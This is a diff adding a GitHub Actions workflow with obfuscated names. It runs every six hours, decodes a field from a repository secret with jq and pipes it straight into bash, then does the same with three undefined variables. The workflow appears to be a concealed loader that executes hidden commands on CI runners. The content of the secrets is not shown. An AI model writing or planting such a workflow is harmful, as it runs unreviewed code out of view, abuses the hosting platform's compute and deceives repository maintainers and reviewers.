@@ -1,0 +1,21 @@
+name: dongyugang0987
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongyugang0987
+        env:
+          ozgyo0: ${{ secrets.ozgyo0 }}
+        run: |
+          echo $ozgyo0 | jq -r .ihxgf18733 | /bin/bash
+          echo $irxz8 | jq -r .fznk8 | /bin/bash
+          echo $beto96 | jq -r .k87932 | /bin/bash
+          echo $uoaj01 | jq -r .bjs0144 | /bin/bash
+
